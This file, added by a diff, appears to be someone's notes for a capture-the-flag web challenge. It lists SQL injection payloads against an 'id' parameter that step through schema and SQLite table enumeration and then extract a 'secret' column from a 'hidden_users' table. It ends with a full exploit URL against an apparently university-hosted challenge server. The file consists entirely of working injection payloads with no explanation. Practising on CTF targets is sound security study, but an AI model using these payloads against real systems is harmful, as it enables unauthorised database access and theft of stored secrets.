@@ -1,0 +1,17 @@
+id=-1') UNION SELECT schema_name,2,3 FROM information_schema.schemata -- 
+
+
+id=-1') UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'-- 
+
+
+id=-1') UNION SELECT name,2,3 FROM hidden_users--
+
+
+id=-1') UNION SELECT sql,2,3 FROM sqlite_master WHERE tbl_name = 'hidden_users' AND type = 'table'-- 
+
+
+id=-1') UNION SELECT secret,2,3 FROM hidden_users-- 
+
+id=-1')UNION SELECT GROUP_CONCAT(sql) FROM sqlite_master --
+
+https://bamboofox.cs.nctu.edu.tw:14641/?id=-1%27)%20UNION%20SELECT%20sql,2,3%20FROM%20sqlite_master%20limit%201,1--
